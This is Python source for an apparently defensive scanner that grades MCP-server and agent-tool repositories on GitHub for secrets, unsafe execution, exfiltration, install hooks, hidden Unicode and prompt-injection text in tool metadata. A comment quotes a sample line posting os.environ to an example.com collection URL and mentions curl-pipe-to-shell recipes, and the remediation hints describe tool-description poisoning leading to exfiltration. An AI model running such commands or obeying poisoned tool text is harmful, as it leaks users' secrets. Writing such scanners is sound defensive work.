"""Core MCP server security scanner.

Fetches source files from GitHub repos and scans for security issues.
Designed to run against the recruitment_prospects table of discovered repos.
"""
from __future__ import annotations

import hashlib
import json
import logging
import re
from dataclasses import dataclass, field
from pathlib import Path

import httpx

from src.scanner.patterns import (
    AGENT_METADATA_FILES,
    AUTH_POSITIVE_PATTERNS,
    DYNAMIC_REMOTE_LOAD_PATTERNS,
    EXEC_SINK_RE,
    EXFILTRATION_PATTERNS,
    EXTENSIONLESS_SCAN_FILES,
    FILE_READ_RE,
    FS_ACCESS_PATTERNS,
    INSECURE_DESERIALIZATION_PATTERNS,
    INSTALL_SCRIPT_DANGER_RE,
    INVISIBLE_UNICODE_PATTERNS,
    MANIFEST_EXEC_PATTERNS,
    NET_READ_RE,
    NPM_INSTALL_HOOKS,
    OBFUSCATION_PATTERNS,
    OUTBOUND_SEND_RE,
    PROMPT_INJECTION_PATTERNS,
    SECRET_PATTERNS,
    SENSITIVE_READ_RE,
    SKIP_DIRS,
    SKIP_EXTENSIONS,
    SOURCE_EXTENSIONS,
    UNSAFE_EXEC_PATTERNS,
    UNTRUSTED_INPUT_RE,
)

# Inline suppression marker — append to any line to skip scanning it
_SUPPRESSION_COMMENT = "ag-scan:ignore"

# Allowlist file path (JSON array of {file_path, name} objects to skip)
_ALLOWLIST_PATH = Path(__file__).parent / "allowlist.json"

logger = logging.getLogger(__name__)

_TIMEOUT = 30
_MAX_FILE_SIZE = 500_000  # 500KB — skip huge files
_MAX_FILES_PER_REPO = 200  # don't scan massive monorepos


_REMEDIATION_HINTS: dict[str, str] = {
    "secret": "Move to environment variable or secrets manager",
    "unsafe_exec": "Validate and sanitize input before execution",
    "fs_access": "Restrict paths to allowed directories",
    "exfiltration": "Add authentication to outbound data endpoints",
    "obfuscation": "Replace obfuscated code with readable equivalent",
    "dependency": "Update to a patched version or find an alternative package",
    "dynamic_remote_load": (
        "Pin remote payloads by commit SHA / content hash and never eval/exec fetched "
        "content — a mutable remote URL can be swapped after integration (rug-pull)"
    ),
    "hidden_unicode": (
        "Remove invisible/bidi/tag Unicode — it can smuggle instructions a human reviewer "
        "never sees (prompt injection)"
    ),
    "prompt_injection": (
        "Remove instruction-override / hidden-directive text from tool descriptions and "
        "metadata — it poisons the agent that reads the tool"
    ),
    "insecure_deserialization": (
        "Never deserialize untrusted data with pickle/marshal/dill/yaml.load — use a "
        "safe format (JSON) or yaml.safe_load / allow_pickle=False"
    ),
    "install_hook": (
        "Audit npm pre/post-install lifecycle scripts — they auto-run on `npm install` "
        "and are a top supply-chain vector; avoid fetching/executing remote content there"
    ),
    "toxic_flow": (
        "This tool combines private-data access, untrusted-input ingestion, and outbound "
        "send — the prompt-injection→exfiltration chain. Isolate the capabilities: don't "
        "let untrusted content reach an outbound path that can carry secrets"
    ),
}


@dataclass
class Finding:
    """A single security finding."""

    category: str  # "secret", "unsafe_exec", "fs_access"
    name: str
    severity: str  # "critical", "high", "medium", "low", "info"
    file_path: str
    line_number: int
    snippet: str  # surrounding context (redacted for secrets)
    remediation: str = ""  # actionable fix suggestion


@dataclass
class ScanResult:
    """Result of scanning one repository."""

    repo: str
    stars: int
    description: str
    framework: str
    findings: list[Finding] = field(default_factory=list)
    positive_signals: list[str] = field(default_factory=list)
    files_scanned: int = 0
    # Coverage disclosure (#4): total scannable files BEFORE the _MAX_FILES_PER_REPO cap,
    # and whether the signed grade is only a sample of the repo. Surfaced in the attestation
    # so a partial-coverage grade is never presented as an authoritative whole-repo verdict.
    total_scannable_files: int = 0
    sampled: bool = False
    has_readme: bool = False
    has_license: bool = False
    has_tests: bool = False
    primary_language: str = ""
    suppressed_count: int = 0  # lines with ag-scan:ignore
    trust_score: int = 0  # 0-100, computed after scan
    category_scores: dict[str, int] = field(default_factory=dict)  # per-category 0-100
    is_mcp_server: bool = False  # context-aware: MCP servers have expected tool patterns
    is_media_tool: bool = False  # context-aware: audio/TTS/video tools have expected fs patterns
    # #8 tool-definition pinning: canonical digest per agent/tool manifest, so a re-scan
    # can prove a tool definition drifted (rug-pull) even if the code still scans clean.
    tool_digests: dict[str, str] = field(default_factory=dict)  # path -> "sha256:..."
    tool_manifest_digest: str | None = None  # combined digest folded into the attestation
    error: str | None = None

    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "critical")

    @property
    def high_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "high")

    @property
    def medium_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "medium")


def _should_skip_path(path: str) -> bool:
    """Check if a file path should be skipped."""
    parts = Path(path).parts
    for part in parts:
        if part in SKIP_DIRS:
            return True
    ext = Path(path).suffix.lower()
    if ext in SKIP_EXTENSIONS:
        return True
    # Also skip if it looks like a minified file
    name = Path(path).name.lower()
    if ".min." in name:
        return True
    return False


def _is_source_file(path: str) -> bool:
    """Check if a file should be scanned for source patterns."""
    ext = Path(path).suffix.lower()
    if ext in SOURCE_EXTENSIONS:
        return True
    # Check extensionless files by name (Dockerfile, Makefile, etc.)
    filename = Path(path).name
    if filename in EXTENSIONLESS_SCAN_FILES:
        return True
    # Agent metadata files (SKILL.md etc.) — the tool's instruction surface
    return filename.lower() in AGENT_METADATA_FILES


def _redact_secret(line: str, match: re.Match) -> str:  # type: ignore[type-arg]
    """Redact the actual secret value from the snippet."""
    start, end = match.span()
    # Show first 4 and last 4 chars of match, redact middle
    matched = match.group()
    if len(matched) > 12:
        redacted = matched[:4] + "..." + matched[-4:]
    else:
        redacted = matched[:2] + "***"
    return line[:start] + redacted + line[end:]


def _detect_language(files: list[dict]) -> str:
    """Detect primary language from file extensions.

    Only counts *real programming-language* extensions (the keys of ``lang_map``) —
    config/data files (.json/.yaml/.toml/.ini/…) are NOT languages, so a TypeScript
    repo full of package.json/tsconfig.json no longer reports its primary language as
    ".json".
    """
    lang_map = {
        ".py": "Python", ".ipynb": "Python",
        ".js": "JavaScript", ".mjs": "JavaScript", ".cjs": "JavaScript",
        ".jsx": "JavaScript",
        ".ts": "TypeScript", ".tsx": "TypeScript",
        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
        ".php": "PHP", ".swift": "Swift", ".scala": "Scala",
        ".lua": "Lua", ".pl": "Perl", ".pm": "Perl", ".r": "R",
        ".groovy": "Groovy",
        ".sh": "Shell", ".bash": "Shell", ".zsh": "Shell",
    }
    ext_counts: dict[str, int] = {}
    for f in files:
        ext = Path(f.get("path", "")).suffix.lower()
        if ext in lang_map:
            ext_counts[ext] = ext_counts.get(ext, 0) + 1

    if not ext_counts:
        return "unknown"
    top_ext = max(ext_counts, key=ext_counts.get)  # type: ignore[arg-type]
    return lang_map[top_ext]


async def _fetch_repo_tree(
    owner: str, repo: str, token: str | None = None,
) -> list[dict]:
    """Fetch the file tree of a repo via GitHub API."""
    headers = {"Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"token {token}"

    async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
        # Get default branch
        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}",
            headers=headers,
        )
        if resp.status_code != 200:
            logger.warning(
                "GitHub repo API returned %d for %s/%s (rate_remaining=%s, auth=%s)",
                resp.status_code, owner, repo,
                resp.headers.get("x-ratelimit-remaining", "?"),
                "yes" if token else "no",
            )
            return []
        default_branch = resp.json().get("default_branch", "main")

        # Get tree (recursive)
        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}/git/trees/{default_branch}",
            headers=headers,
            params={"recursive": "1"},
        )
        if resp.status_code != 200:
            logger.warning(
                "GitHub tree API returned %d for %s/%s (rate_remaining=%s)",
                resp.status_code, owner, repo,
                resp.headers.get("x-ratelimit-remaining", "?"),
            )
            return []

        tree = resp.json().get("tree", [])
        # Filter to blobs (files) only
        return [
            item for item in tree
            if item.get("type") == "blob"
            and item.get("size", 0) <= _MAX_FILE_SIZE
        ]


async def _fetch_file_content(
    owner: str, repo: str, path: str, token: str | None = None,
) -> str | None:
    """Fetch raw file content from GitHub."""
    headers = {"Accept": "application/vnd.github.raw+json"}
    if token:
        headers["Authorization"] = f"token {token}"

    async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=headers,
        )
        if resp.status_code == 200:
            return resp.text
    return None


def _load_allowlist() -> set[tuple[str, str]]:
    """Load the false-positive allowlist from disk.

    Returns a set of (file_path_glob, finding_name) tuples.
    Each entry suppresses the named finding for matching file paths.
    """
    if not _ALLOWLIST_PATH.exists():
        return set()
    try:
        data = json.loads(_ALLOWLIST_PATH.read_text())
        return {(e["file_path"], e["name"]) for e in data if "file_path" in e and "name" in e}
    except Exception:
        logger.warning("Failed to load scanner allowlist from %s", _ALLOWLIST_PATH)
        return set()


def _is_allowlisted(
    file_path: str, finding_name: str, allowlist: set[tuple[str, str]],
) -> bool:
    """Check if a finding is allowlisted.

    Supports exact match and simple glob patterns (* at end).
    """
    for pattern, name in allowlist:
        if name != finding_name:
            continue
        if pattern == file_path:
            return True
        # Simple glob: "src/utils/*" matches "src/utils/helpers.py"
        if pattern.endswith("*") and file_path.startswith(pattern[:-1]):
            return True
    return False


# ---------------------------------------------------------------------------
# Context-aware checks — reduce false positives for safe usage patterns
# ---------------------------------------------------------------------------

# Regex: subprocess.run/call/etc with a hardcoded string list as first arg
# e.g. subprocess.run(["git", "status"]) or subprocess.run("ls -la", ...)
_SAFE_SUBPROCESS_RE = re.compile(
    r"""subprocess\.(?:run|call|check_output|Popen)\s*\(\s*\[?\s*['"]""",
)

# Regex: subprocess with well-known safe commands (git, pip, npm, node, etc.)
_SAFE_SUBPROCESS_CMDS_RE = re.compile(
    r"""subprocess\.(?:run|call|check_output|Popen)\s*\(\s*\[\s*['"](git|pip|pip3|npm|npx|node|python|python3|go|cargo|make|cmake|docker|kubectl|terraform|helm|yarn|pnpm|mvn|gradle|rustc|gcc|g\+\+|clang|javac|ruby|bundle|rake|composer|dotnet|swift|xcodebuild|brew|apt|apt-get|yum|dnf|apk|conda|uv|ruff|black|isort|mypy|pytest|eslint|prettier|tsc|webpack|vite)['"]""",
)

# Regex: open() on a known safe path / with Path objects / read-only config
_SAFE_OPEN_PATTERNS = [
    # Path(...).open() or Path(...).read_text() / write_text()
    re.compile(r"Path\s*\(.*\)\s*\.(?:open|read_text|write_text|read_bytes|write_bytes)\s*\("),
    # open() with a hardcoded string path (no variable interpolation)
    re.compile(r"""open\s*\(\s*['"][^'"{}$]+['"]\s*[,)]"""),
    # with open(..., hardcoded path) as f — context manager with string literal path
    re.compile(r"""with\s+open\s*\(\s*['"][^'"{}$]+['"]"""),
]

# Config file extensions — reading these is almost always legitimate
_CONFIG_FILE_EXTENSIONS = frozenset({
    ".json", ".yml", ".yaml", ".toml", ".cfg", ".ini", ".conf",
    ".xml", ".properties", ".env.example", ".env.template",
})

# Safe write destinations — writing to these directories is expected behavior
_SAFE_WRITE_DIRS = frozenset({
    "logs", "log", "tmp", "temp", ".cache", "cache", "__pycache__",
    ".tmp", "output", "out", "build", "dist", ".build",
})

# Regex: open() reading a config file by extension
_CONFIG_FILE_READ_RE = re.compile(
    r"""open\s*\([^)]*['"][\w./\\-]+\.(?:json|ya?ml|toml|cfg|ini|conf|xml|properties)['"]""",
)

# Regex: writing to a known safe directory (logs/, tmp/, .cache/, etc.)
_SAFE_WRITE_DIR_RE = re.compile(
    r"""open\s*\([^)]*['"](/?(?:[\w.-]+/)*(?:logs?|tmp|temp|\.cache|cache|output|out|build|dist)/[^'"]+)['"]""",
)

# Regex: safe exec/eval — e.g. ast.literal_eval, json.loads with exec in name
_SAFE_EVAL_RE = re.compile(
    r"""(?:ast\.literal_eval|json\.loads?|yaml\.safe_load)\s*\(""",
)

# Regex: safe DB execute — db.execute(), session.execute(), conn.execute(), etc.
_SAFE_DB_EXEC_RE = re.compile(
    r"""(?:await\s+)?(?:\w+\.)?(?:db|session|conn(?:ection)?|cursor|engine|tx|transaction)\.exec(?:ute|utescalar|utemany)\s*\(""",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Known vulnerable dependency patterns (major CVEs / critical issues)
# Each: (package_name_pattern, vulnerable_version_pattern, severity, description)
# ---------------------------------------------------------------------------
_VER = r"\s*[=<>~!]=?\s*['\"]?"  # version operator shorthand

_VULN_DEPS: list[tuple[str, re.Pattern[str], str, str]] = [
    # -- Python packages --
    (
        "requests",
        re.compile(r"requests" + _VER + r"2\.\d{1,2}\b"),
        "high",
        "requests <2.31.0 leaks Proxy-Authorization header",
    ),
    (
        "urllib3",
        re.compile(r"urllib3" + _VER + r"1\.2[0-5]\b"),
        "high",
        "urllib3 <1.26.18 cookie/header leak",
    ),
    (
        "cryptography",
        re.compile(
            r"cryptography" + _VER
            + r"(3\d*\.|[012]\.|40\.|41\.0\.[012]\b)",
        ),
        "critical",
        "cryptography <41.0.3 OpenSSL vulnerabilities",
    ),
    (
        "pyjwt",
        re.compile(r"[Pp]y[Jj][Ww][Tt]" + _VER + r"[01]\."),
        "high",
        "PyJWT <2.0 algorithm confusion vulnerability",
    ),
    (
        "django",
        re.compile(r"[Dd]jango" + _VER + r"[0-3]\."),
        "critical",
        "Django <4.0 EOL with unpatched CVEs",
    ),
    (
        "flask",
        re.compile(r"[Ff]lask" + _VER + r"[01]\."),
        "high",
        "Flask <2.0 missing security fixes",
    ),
    (
        "pillow",
        re.compile(
            r"[Pp]illow" + _VER + r"(9\.[0-4]\.|[0-8]\.)",
        ),
        "high",
        "Pillow <9.5.0 buffer overflow CVEs",
    ),
    (
        "setuptools",
        re.compile(
            r"setuptools" + _VER + r"(6[0-4]\.|[0-5]\d?\.)",
        ),
        "medium",
        "setuptools <65.5.1 CVE-2022-40897 ReDoS",
    ),
    (
        "certifi",
        re.compile(r"certifi" + _VER + r"202[0-2]\."),
        "high",
        "certifi <2023.07.22 revoked e-Tugra root cert",
    ),
    (
        "aiohttp",
        re.compile(r"aiohttp" + _VER + r"3\.[0-8]\."),
        "high",
        "aiohttp <3.9.0 HTTP request smuggling CVEs",
    ),
    (
        "jinja2",
        re.compile(r"[Jj]inja2" + _VER + r"[0-2]\."),
        "high",
        "Jinja2 <3.0 sandbox escape vulnerabilities",
    ),
    (
        "sqlalchemy",
        re.compile(
            r"[Ss][Qq][Ll][Aa]lchemy" + _VER + r"1\.[0-3]\.",
        ),
        "medium",
        "SQLAlchemy <1.4 SQL injection edge cases",
    ),
    (
        "lxml",
        re.compile(r"lxml" + _VER + r"4\.[0-8]\."),
        "high",
        "lxml <4.9.1 CVE-2022-2309",
    ),
    (
        "paramiko",
        re.compile(r"paramiko" + _VER + r"[0-2]\."),
        "high",
        "paramiko <3.0 auth bypass / RCE vulnerabilities",
    ),
    (
        "pyyaml",
        re.compile(
            r"[Pp][Yy][Yy][Aa][Mm][Ll]" + _VER + r"[0-5]\.",
        ),
        "critical",
        "PyYAML <6.0 unsafe YAML deserialization",
    ),
    # -- Node.js packages --
    (
        "jsonwebtoken",
        re.compile(r'"jsonwebtoken"\s*:\s*"[\^~]?[0-7]\.'),
        "high",
        "jsonwebtoken <8.5.1 algorithm confusion",
    ),
    (
        "lodash",
        re.compile(r'"lodash"\s*:\s*"[\^~]?[0-3]\.'),
        "high",
        "lodash <4.17.21 prototype pollution",
    ),
    (
        "express",
        re.compile(r'"express"\s*:\s*"[\^~]?[0-3]\.'),
        "medium",
        "express <4.x EOL, missing security patches",
    ),
    (
        "axios",
        re.compile(r'"axios"\s*:\s*"[\^~]?0\.'),
        "medium",
        "axios 0.x SSRF and ReDoS vulnerabilities",
    ),
    (
        "node-fetch",
        re.compile(r'"node-fetch"\s*:\s*"[\^~]?[01]\.'),
        "medium",
        "node-fetch <2.6.7 CVE-2022-0235",
    ),
    (
        "minimist",
        re.compile(r'"minimist"\s*:\s*"[\^~]?[01]\.[0-1]\.'),
        "high",
        "minimist <1.2.6 prototype pollution",
    ),
    (
        "tar",
        re.compile(r'"tar"\s*:\s*"[\^~]?[0-5]\.'),
        "high",
        "tar <6.1.9 arbitrary file creation",
    ),
    (
        "got",
        re.compile(r'"got"\s*:\s*"[\^~]?[0-9]\.'),
        "medium",
        "got <11.8.5 open redirect vulnerability",
    ),
    (
        "shell-quote",
        re.compile(r'"shell-quote"\s*:\s*"[\^~]?1\.[0-6]\.'),
        "critical",
        "shell-quote <1.7.3 command injection",
    ),
    (
        "passport",
        re.compile(r'"passport"\s*:\s*"[\^~]?0\.[0-5]\.'),
        "high",
        "passport <0.6.0 session fixation",
    ),
]

# Dependency file names we parse
_DEP_FILES = frozenset({
    "requirements.txt", "pyproject.toml", "setup.py", "setup.cfg",
    "Pipfile", "package.json", "Cargo.toml", "Gemfile",
})


def _is_test_or_doc_file(file_path: str) -> bool:
    """Check if a file is a test, doc, or example file (lower severity)."""
    lower = file_path.lower()
    parts = Path(file_path).parts
    # Test directories and files
    if any(p in ("tests", "test", "spec", "__tests__", "testing") for p in parts):
        return True
    name = Path(file_path).stem.lower()
    if name.startswith("test_") or name.endswith("_test") or name.endswith("_spec"):
        return True
    if name == "conftest":
        return True
    # Doc / example directories
    if any(p in ("docs", "doc", "examples", "example", "samples") for p in parts):
        return True
    # Config examples
    if ".example" in lower or ".sample" in lower or ".template" in lower:
        return True
    return False


def _is_infra_file(file_path: str) -> bool:
    """Check if a file is CI/infra config (graded like tests/docs, not shipped code).

    Dockerfiles, `.github/**` / `.gitlab/**` workflow YAMLs, and agent skill configs
    (`.agents/**`) legitimately contain `RUN curl | sh`, pipe-to-shell, etc. Their
    findings are DOWNGRADED (same as tests/docs) so a single CI recipe can't produce
    the critical that zeroes an otherwise-clean repo's grade.
    """
    parts = Path(file_path).parts
    if any(p in (".github", ".gitlab", ".agents", ".circleci", ".buildkite") for p in parts):
        return True
    name = Path(file_path).name
    lname = name.lower()
    if name == "Dockerfile" or name.startswith("Dockerfile.") or lname.endswith(".dockerfile"):
        return True
    # Common root-level CI config files
    if lname in (".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "cloudbuild.yaml"):
        return True
    # Workflow YAMLs (e.g. under a workflows/ directory)
    if any(p == "workflows" for p in parts) and lname.endswith((".yml", ".yaml")):
        return True
    return False


# --- Per-file language dispatch (#2) -----------------------------------------
# Language-SPECIFIC pattern groups must only run on files of that language, so Python
# `exec()` no longer fires on `.mjs` and Ruby `system`/backtick no longer fires on TS
# template literals. Language-AGNOSTIC groups (secrets, exfiltration, invisible unicode,
# prompt injection) keep running on every file.
_EXT_TO_LANG: dict[str, str] = {
    ".py": "python", ".ipynb": "python",
    ".js": "javascript", ".mjs": "javascript", ".cjs": "javascript", ".jsx": "javascript",
    ".ts": "typescript", ".tsx": "typescript",
    ".rb": "ruby",
    ".go": "go",
    ".rs": "rust",
    ".java": "java",
}

# A pattern's NAME carries its language tag (e.g. "(Python)", "(Node.js)"); map those
# tags to the file-languages they apply to. Node runs both JS and TS.
_PATTERN_LANG_TAGS: list[tuple[str, frozenset]] = [
    ("python", frozenset({"python"})),
    ("node", frozenset({"javascript", "typescript"})),
    ("(js)", frozenset({"javascript", "typescript"})),
    ("ruby", frozenset({"ruby"})),
    ("(go)", frozenset({"go"})),
    ("rust", frozenset({"rust"})),
    ("java", frozenset({"java"})),
]


def _required_langs(pattern_name: str) -> frozenset:
    """Languages a pattern targets, inferred from its name. Empty = language-agnostic."""
    lname = pattern_name.lower()
    langs: set = set()
    for tag, mapped in _PATTERN_LANG_TAGS:
        if tag in lname:
            langs |= mapped
    return frozenset(langs)


def _lang_ok(pattern_name: str, file_lang: str | None) -> bool:
    """True if a (possibly language-specific) pattern should run on this file.

    Patterns whose name has no language tag are agnostic → always run. A tagged
    pattern runs only when the file's detected language is one it targets.
    """
    required = _required_langs(pattern_name)
    if not required:
        return True
    if file_lang is None:
        return False
    return file_lang in required


def _is_safe_exec_context(
    line: str, finding_name: str, file_path: str = "",
) -> bool:
    """Check if an unsafe_exec match is actually a safe usage pattern."""
    stripped = line.strip()
    filename = Path(file_path).name.lower() if file_path else ""

    # subprocess with hardcoded args → safe (but NOT if shell=True is present)
    if "subprocess" in finding_name.lower():
        has_shell_true = "shell=True" in stripped or "shell = True" in stripped
        if not has_shell_true and _SAFE_SUBPROCESS_RE.search(stripped):
            return True
        # subprocess with well-known safe commands (git, pip, npm, etc.)
        if not has_shell_true and _SAFE_SUBPROCESS_CMDS_RE.search(stripped):
            return True
        # Also safe: subprocess with shell=False (explicit)
        if "shell=False" in stripped or "shell = False" in stripped:
            return True
        # subprocess.run with capture_output (typically safe tooling)
        if "capture_output=True" in stripped and not has_shell_true:
            return True

    # eval/exec — skip if it's ast.literal_eval or similar safe wrappers
    if "eval" in finding_name.lower() or "exec" in finding_name.lower():
        if _SAFE_EVAL_RE.search(stripped):
            return True
        # db.execute(), session.execute(), conn.execute() — SQLAlchemy / DB calls
        if _SAFE_DB_EXEC_RE.search(stripped):
            return True
        # cursor.execute() — standard DB-API
        if "cursor" in stripped.lower() and "execute" in stripped.lower():
            return True
        # await exec(session, ...) — common DB helper wrapper pattern
        if re.search(r"""(?:await\s+)?exec\s*\(\s*(?:session|conn|db|cursor)""", stripped):
            return True
        # def exec(...) or async def exec(...) — function definition, not builtin exec
        if re.search(r"""(?:async\s+)?def\s+exec\s*\(""", stripped):
            return True

    # eval() in __init__.py — commonly used for version parsing, e.g. eval(f.read())
    if "eval" in finding_name.lower() and filename == "__init__.py":
        # Only safe if it looks like version extraction
        if re.search(r"""(?:version|__version__|VERSION)""", stripped, re.IGNORECASE):
            return True

    # exec() in migration files or setup.py — expected usage
    if "exec" in finding_name.lower():
        parts = Path(file_path).parts if file_path else ()
        is_migration = any(
            p in ("migrations", "alembic", "versions", "migrate")
            for p in parts
        )
        is_setup = filename in ("setup.py", "setup.cfg", "conftest.py")
        if is_migration or is_setup:
            return True

    return False


def _is_safe_fs_context(
    line: str, _finding_name: str, file_path: str = "",
) -> bool:
    """Check if a file system access match is actually a safe usage pattern."""
    stripped = line.strip()

    for safe_pat in _SAFE_OPEN_PATTERNS:
        if safe_pat.search(stripped):
            return True

    # Path.write_text / read_text (already method-chained on Path object)
    if re.search(r"\.(?:read_text|write_text|read_bytes|write_bytes)\s*\(", stripped):
        return True

    # Reading config files by extension — almost always legitimate
    if _CONFIG_FILE_READ_RE.search(stripped):
        return True

    # Writing to known safe directories (logs/, tmp/, .cache/, etc.)
    if _SAFE_WRITE_DIR_RE.search(stripped):
        return True

    # open() with a string literal filename containing a config extension
    # e.g. open("settings.toml"), open("config.yml")
    m = re.search(r"""open\s*\(\s*['"]([^'"]+)['"]""", stripped)
    if m:
        target_path = m.group(1)
        target_ext = Path(target_path).suffix.lower()
        if target_ext in _CONFIG_FILE_EXTENSIONS:
            return True
        # Writing to a safe directory based on path components
        target_parts = Path(target_path).parts
        if any(p.lower() in _SAFE_WRITE_DIRS for p in target_parts):
            return True

    return False


def _downgrade_fs_severity(
    line: str, severity: str,
) -> str:
    """Downgrade fs_access severity for safer patterns like pathlib usage."""
    stripped = line.strip()
    # pathlib.Path usage is generally safer than raw open() — sandboxed by design
    if "Path(" in stripped or "pathlib" in stripped:
        if severity == "high":
            return "medium"
        if severity == "medium":
            return "low"
    return severity


def _upgrade_shell_true_severity(
    line: str, severity: str,
) -> str:
    """Upgrade severity when shell=True is present — always dangerous."""
    stripped = line.strip()
    if "shell=True" in stripped or "shell = True" in stripped:
        # shell=True is always critical regardless of original severity
        return "critical"
    return severity


def _scan_content(
    content: str, file_path: str,
    allowlist: set[tuple[str, str]] | None = None,
) -> tuple[list[Finding], list[str], int]:
    """Scan file content for security issues and positive signals.

    Returns (findings, positive_signals, suppressed_count).
    """
    findings: list[Finding] = []
    positives: list[str] = []
    suppressed_count = 0
    if allowlist is None:
        allowlist = set()

    is_test_or_doc = _is_test_or_doc_file(file_path)
    # CI/infra files (#3) are graded like tests/docs so a Dockerfile / workflow recipe
    # can't dominate the grade with a critical.
    is_infra = _is_infra_file(file_path)
    # Findings in tests/docs/infra are downgraded (never suppressed).
    is_downgraded = is_test_or_doc or is_infra
    # Per-file language for language-specific pattern dispatch (#2).
    file_lang = _EXT_TO_LANG.get(Path(file_path).suffix.lower())
    # Manifest / skill files ARE the tool's instruction surface — never downgrade
    # prompt-injection / hidden-unicode there even if they look doc-ish.
    is_metadata = Path(file_path).name.lower() in AGENT_METADATA_FILES
    lines = content.split("\n")

    for line_num, line in enumerate(lines, 1):
        # Skip comments (basic heuristic)
        stripped = line.strip()
        if stripped.startswith(("#", "//", "*", "/*")):
            continue
        # NOTE: (#6) we deliberately do NOT skip an entire line just because it contains
        # the word "example"/"placeholder" — that let an attacker neutralize any rule with
        # `# example` and silently ignored real code like
        # `requests.post("https://example.com/collect", data=os.environ)`. Placeholder
        # handling is now scoped to the matched secret VALUE only (see the secret loop).

        # --- Option 1: Inline suppression ---
        # If the line contains "ag-scan:ignore", skip pattern checks but
        # count it — excessive suppression is suspicious.
        # Track the line for severity-weighted penalty calculation later.
        if _SUPPRESSION_COMMENT in line:
            suppressed_count += 1
            continue

        # Check secrets
        for name, pattern, severity in SECRET_PATTERNS:
            match = pattern.search(line)
            if match:
                # Extra filter: skip if it's in a .env.example or test file
                if ".example" in file_path or "test" in file_path.lower():
                    continue
                # Skip if the MATCHED VALUE is clearly a placeholder (not the whole line).
                # The captured secret value (group 1 when present, else the full match).
                val = match.group(1) if match.groups() else match.group()
                val_lower = val.lower()
                if val in ("YOUR_API_KEY", "your_api_key", "xxx", "changeme") or any(
                    tok in val_lower for tok in ("example", "placeholder", "your_api_key")
                ):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="secret",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=_redact_secret(stripped[:120], match),
                ))
                break  # one finding per line for secrets

        # Check unsafe exec
        for name, pattern, severity in UNSAFE_EXEC_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2): skip a language-specific pattern on a
                # non-matching file (e.g. Python exec() on a .mjs file).
                if not _lang_ok(name, file_lang):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # --- Option 3: Context-aware check ---
                if _is_safe_exec_context(line, name, file_path):
                    continue
                # Downgrade severity in test/doc/infra files
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                # Upgrade severity for shell=True (always dangerous)
                effective_severity = _upgrade_shell_true_severity(
                    line, effective_severity,
                )
                findings.append(Finding(
                    category="unsafe_exec",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check insecure deserialization (#7) — RCE class; NOT discounted for MCP
        for name, pattern, severity in INSECURE_DESERIALIZATION_PATTERNS:
            if pattern.search(line):
                if not _lang_ok(name, file_lang):
                    continue
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="insecure_deserialization",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check file system access
        for name, pattern, severity in FS_ACCESS_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2)
                if not _lang_ok(name, file_lang):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # --- Option 3: Context-aware check ---
                if _is_safe_fs_context(line, name, file_path):
                    continue
                # Downgrade severity in test/doc/infra files
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                # Downgrade for safer pathlib patterns
                effective_severity = _downgrade_fs_severity(
                    line, effective_severity,
                )
                findings.append(Finding(
                    category="fs_access",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check data exfiltration
        for name, pattern, severity in EXFILTRATION_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="exfiltration",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check dynamic remote payload / rug-pull (external-URL-swap)
        for name, pattern, severity in DYNAMIC_REMOTE_LOAD_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2) — untagged patterns (e.g. curl|sh) stay agnostic.
                if not _lang_ok(name, file_lang):
                    continue
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # Downgrade in test/doc/infra files like other groups
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check invisible / smuggled Unicode (dangerous anywhere — no downgrade)
        for name, pattern, severity in INVISIBLE_UNICODE_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="hidden_unicode",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check prompt injection / tool-description poisoning
        for name, pattern, severity in PROMPT_INJECTION_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # Downgrade in test/doc/infra files — EXCEPT manifest/skill metadata,
                # which is the actual attack surface (a poisoned description is not a doc).
                effective_severity = severity
                if is_downgraded and not is_metadata and severity in ("critical", "high"):
